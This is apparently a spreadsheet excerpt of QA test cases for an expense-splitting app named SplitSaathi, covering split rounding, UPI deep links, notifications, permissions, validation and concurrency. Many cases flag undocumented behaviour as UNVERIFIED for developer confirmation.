TC-ATTACH-009,Attachments,Happy Path,Medium,Object storage configured; expense has an existing attachment,1. Delete the attachment from the expense,Delete attachment,200: attachment record removed/unlinked from the expense; corresponding S3/MinIO object is deleted or scheduled for cleanup (UNVERIFIED whether deletion is synchronous — confirm with dev).,Section 2 Expense Attachments & Receipts,
TC-IMPEXP-009,Export - Concurrent large export,Boundary,Medium,"Group with 5,000 expenses (very large group history)",1. Owner requests PDF export of the full group history,"5,000-expense export",UNVERIFIED — doc doesn't specify pagination/streaming behavior for very large exports or a timeout ceiling; expected the export either streams/paginates internally or is generated as a background job with a downloadable link; confirm approach with dev.,Section 2 Import/Export,Scalability gap: large-export handling undocumented
TC-IMPEXP-010,Import - Duplicate detection,Boundary,Medium,Owner re-imports the SAME Splitwise CSV a second time (accidental double-upload),"1. Import a CSV
2. Import the identical CSV file again",Duplicate CSV import,UNVERIFIED — doc doesn't specify duplicate-detection logic for re-imports; expected risk of duplicate expenses being created on re-upload unless de-duplication (e.g. by external transaction ID) exists; confirm with dev.,Section 2 Import/Export,Data integrity gap: no documented import de-duplication
TC-UPI-007,UPI Deep Link,Boundary,Low,"Payee VPA contains valid but unusual characters, e.g. 'user.name-123@okbank'",1. Generate UPI URI for this VPA,payeeVpa=user.name-123@okbank,VPA is correctly embedded in the pa= parameter without corruption; dots/hyphens are valid VPA characters per UPI spec and must not be stripped or escaped incorrectly.,Section 3.4 UpiUriBuilder,
TC-SETTLE-OPT-011,Debt Simplification,Boundary,Medium,"Large group: 50 members with a complex web of debts (25 debtors, 25 creditors, varying amounts)",1. GET /v1/groups/:id/settlements/suggestions for the 50-member group,50-member complex debt graph,"GreedySettlementOptimizer produces at most 49 transactions (N-1 upper bound for N non-zero balances) — verify actual output is well below worst-case and each individual transaction amount is the min() of the current largest debtor/creditor pair at each step, per the documented greedy algorithm.",Section 3.4 GreedySettlementOptimizer,Scale/complexity boundary test
TC-GROUP-027,Group - Category filter list,Happy Path,Low,"User is a member of 10 groups across categories: Trip, Household, Office",1. GET /v1/groups?category=Trip,category=Trip filter,"UNVERIFIED — doc's GET /v1/groups endpoint description doesn't explicitly mention category filtering support; confirm whether this query param is implemented, and if so that only Trip-category groups are returned; confirm with dev.",Section 5 GET /v1/groups,
TC-GROUP-028,Group - Unicode group name,Boundary,Low,Authenticated user,1. POST /v1/groups with name='गोवा यात्रा 🏖️',name=गोवा यात्रा 🏖️,201: unicode/emoji group name stored and returned unchanged.,Section 4.2 GroupEntity.name,
TC-FRIEND-012,Friends,Boundary,Low,A and B are friends across MULTIPLE shared groups AND have a direct 1-on-1 ledger simultaneously,1. GET the consolidated balance between A and B (combining direct ledger + all shared-group balances),Combined balance across direct + group contexts,"UNVERIFIED — doc doesn't specify whether the app surfaces one CONSOLIDATED balance across all contexts with a friend, or keeps direct-ledger and each group's balance strictly separate; confirm the intended UX/data model with dev.",Section 2 Friends & 1-on-1 Ledgers,Known gap: consolidated vs. per-context balance display not documented
TC-NOTIF-021,Notification Preferences,Happy Path,Medium,User has disabled push notifications for 'comment added' events in their notification preferences,"1. Another member comments on an expense the user is part of, while their comment-notification preference is OFF",Preference disabled for this event type,UNVERIFIED — doc doesn't describe a per-event-type notification preference system at all; expected (if such preferences exist) no push is sent for this event; confirm whether granular notification preferences are actually implemented with dev.,Section 2 Push Notifications & Emails,Known gap: granular notification preferences not documented
TC-NOTIF-022,Notification Delivery - ios,Notification,Medium,User has a DeviceInstallationEntity with platform='ios',1. Trigger a push-worthy event (e.g. added to a group) for a user whose only registered device is platform='ios',platform=ios,"Push is dispatched via the correct provider for ios (Expo for ios/android via the Expo Push API, or the appropriate web-push mechanism for 'web' — UNVERIFIED whether 'web' push is actually implemented since only expo/fcm drivers are documented; confirm web push support with dev).",Section 4.1 DeviceInstallationEntity.platform enum - ios|android|web,
TC-NOTIF-023,Notification Delivery - android,Notification,Medium,User has a DeviceInstallationEntity with platform='android',1. Trigger a push-worthy event (e.g. added to a group) for a user whose only registered device is platform='android',platform=android,"Push is dispatched via the correct provider for android (Expo for ios/android via the Expo Push API, or the appropriate web-push mechanism for 'web' — UNVERIFIED whether 'web' push is actually implemented since only expo/fcm drivers are documented; confirm web push support with dev).",Section 4.1 DeviceInstallationEntity.platform enum - ios|android|web,
TC-NOTIF-024,Notification Delivery - web,Notification,Medium,User has a DeviceInstallationEntity with platform='web',1. Trigger a push-worthy event (e.g. added to a group) for a user whose only registered device is platform='web',platform=web,"Push is dispatched via the correct provider for web (Expo for ios/android via the Expo Push API, or the appropriate web-push mechanism for 'web' — UNVERIFIED whether 'web' push is actually implemented since only expo/fcm drivers are documented; confirm web push support with dev).",Section 4.1 DeviceInstallationEntity.platform enum - ios|android|web,Known gap: web push delivery mechanism not detailed in doc despite 'web' being a valid platform enum value
TC-SPLIT-PCT-010,Percentage Split - Member Count Sweep,Boundary,Medium,"Group with 2 members, near-equal percentages summing to 100","1. Create expense totalAmountMinor=733301, splitType=percent, percentages={'usr_pc0': 50, 'usr_pc1': 50}","N=2, percentages={'usr_pc0': 50, 'usr_pc1': 50}, totalAmountMinor=733301 (₹7333.01)","Allocation: usr_pc1=₹3666.51, usr_pc0=₹3666.50. Sum=₹7333.01 (must equal total ₹7333.01). Currency=INR.",Section 3.3 Percentage Split; methodology requires member-count boundary sweep,
TC-SPLIT-PCT-011,Percentage Split - Member Count Sweep,Boundary,Medium,"Group with 3 members, near-equal percentages summing to 100","1. Create expense totalAmountMinor=733301, splitType=percent, percentages={'usr_pc0': 34, 'usr_pc1': 33, 'usr_pc2': 33}","N=3, percentages={'usr_pc0': 34, 'usr_pc1': 33, 'usr_pc2': 33}, totalAmountMinor=733301 (₹7333.01)","Allocation: usr_pc0=₹2493.23, usr_pc2=₹2419.89, usr_pc1=₹2419.89. Sum=₹7333.01 (must equal total ₹7333.01). Currency=INR.",Section 3.3 Percentage Split; methodology requires member-count boundary sweep,
TC-SPLIT-PCT-012,Percentage Split - Member Count Sweep,Boundary,Medium,"Group with 7 members, near-equal percentages summing to 100","1. Create expense totalAmountMinor=733301, splitType=percent, percentages={'usr_pc0': 15, 'usr_pc1': 15, 'usr_pc2': 14, 'usr_pc3': 14, 'usr_pc4': 14, 'usr_pc5': 14, 'usr_pc6': 14}","N=7, percentages={'usr_pc0': 15, 'usr_pc1': 15, 'usr_pc2': 14, 'usr_pc3': 14, 'usr_pc4': 14, 'usr_pc5': 14, 'usr_pc6': 14}, totalAmountMinor=733301 (₹7333.01)","Allocation: usr_pc1=₹1099.96, usr_pc0=₹1099.95, usr_pc6=₹1026.62, usr_pc5=₹1026.62, usr_pc4=₹1026.62, usr_pc3=₹1026.62, usr_pc2=₹1026.62. Sum=₹7333.01 (must equal total ₹7333.01). Currency=INR.",Section 3.3 Percentage Split; methodology requires member-count boundary sweep,
TC-SPLIT-EX-011,Exact Split,Boundary,Medium,Group with 10 members,"1. Create expense totalAmountMinor=100000, splitType=exact, with 9 members assigned 9999 each (=89991) and 1 member assigned the odd remainder 10009",10-way exact split with a deliberately uneven remainder holder,"201: sum=89991+10009=100000 exactly; ExpenseShareEntity rows stored with the exact caller-specified (not system-computed) amounts, confirming Exact Split performs zero implicit rounding.",Section 3.3 ExactAmountSplitStrategy - no rounding (exact integer inputs),
TC-SPLIT-WT-013,Weighted/Share Split,Negative,Medium,"Group with members A,B","1. Create expense splitType=weight, weights={A:(1,0),B:(1,1)} (denominator=0 for A)",weightDenominator=0 causes division by zero,400 Bad Request: a zero denominator must be rejected by DTO validation before it reaches RoundingAllocator's division step.,Section 3.3 WeightedShareSplitStrategy; Section 3.2 RoundingAllocator - division by weightDenominator,
TC-EXP-033,Expense Create,Boundary,Low,Group exists,"1. POST /v1/groups/:id/expenses with totalAmountMinor=1 (smallest positive expense, 1 paisa) split equally among 2 members","totalAmountMinor=1, N=2","201: RoundingAllocator gives 1 to whichever participant has the lower stableHash, 0 to the other; sum=1.",Section 3.2 RoundingAllocator - smallest positive amount,
TC-EXP-034,Expense - Payer not a participant,Boundary,Medium,"Group with A,B,C; A pays for an expense but is NOT included in the split (e.g. A treats B and C)","1. Create expense totalAmountMinor=10000, payer=A only, splitType=equal among B,C only (A excluded from owedAmountMinor)",Payer excluded from the share list,"201: A's net = +10000 (fully owed back), B and C each owe 5000; this is a valid and common real-world pattern ('I'm treating you') and must be explicitly supported since payer set and share set are independent per the ExpensePayerEntity/ExpenseShareEntity split.",Section 4.3 ExpensePayerEntity vs ExpenseShareEntity - independent payer/share sets,
TC-VALID-059,DTO Type Validation,Negative,Medium,POST /v1/groups/:id/expenses reachable,"1. Submit participants as a single string instead of an array, e.g. participants='usr_a'","participants='usr_a' (wrong type, should be array)",400 Bad Request: array-typed field validation rejects a bare string.,Section 8 DTO Input Validation,
TC-VALID-060,DTO Type Validation,Negative,Medium,POST /v1/groups/:id/expenses reachable,"1. Submit an array field (e.g. participants) containing duplicate entries: [A, B, A]",Duplicate participant in array,UNVERIFIED — doc doesn't specify de-duplication behavior for participant arrays; expected either automatic de-duplication or a 400 rejecting the duplicate; confirm with dev.,Section 8 DTO Input Validation,
TC-PERM-044,Permissions - Cross-currency export scope,Permission,Low,Group with mixed INR/USD expenses; Admin exports the ledger,1. Admin exports the group ledger (export permission ✅ for Admin),Admin exporting mixed-currency group,200: export succeeds regardless of currency mix — the export permission itself is currency-agnostic per the Authorization Matrix (no currency-based restriction documented).,Section 7 Authorization Matrix - export ✅Admin,
TC-CONC-011,Concurrency - Simultaneous Ghost-to-Group Add,Concurrency,Medium,Owner attempts to add the same new ghost participant (same phone number) to a group twice in rapid succession (double-click),1. Fire two near-simultaneous POST /v1/groups/:id/members with the identical new-ghost phone number,Duplicate ghost-add race,"UNVERIFIED — doc doesn't specify a uniqueness constraint on (groupId, phoneNumber) for ParticipantEntity; expected only ONE ghost participant is created, with the second request either erroring or being treated as a no-op; confirm with dev.",Section 4.2 ParticipantEntity,Concurrency gap: duplicate-ghost-participant race condition
TC-FAIL-007,Failure Recovery,Boundary,Medium,"A settlement's UPI payment succeeds in the user's bank app, but the app crashes before the user can submit proof in SplitSaathi","1. Simulate: UPI payment completed externally, but no POST .../proof call is ever made","External payment success, internal proof never submitted","The SettlementIntentEntity remains stuck in its pre-proof state indefinitely from the system's perspective (SplitSaathi has no visibility into the external UPI app's success) — this is a UX/product gap, not a bug, but should be flagged: recommend a manual 'I already paid' re-entry path or reminder nudge; confirm expected recovery UX with dev.",Section 2 UPI Intent & Deep Link (external app hand-off has no callback documented),Known gap: UPI deep-link hand-off has no documented callback/return mechanism into the app
TC-NOTIF-025,Notifications - Push payload size,Boundary,Low,Expense description is very long (near the max allowed length),1. Create an expense with a maximal-length description and verify the resulting push notification payload,Long description in notification payload,UNVERIFIED — doc doesn't specify push-payload truncation rules; expected the notification body truncates gracefully (e.g. with an ellipsis) rather than failing to send or exceeding provider payload limits (Expo/FCM have documented payload caps); confirm truncation behavior with dev.,Section 6 Push Notifications - Expo/FCM payload limits,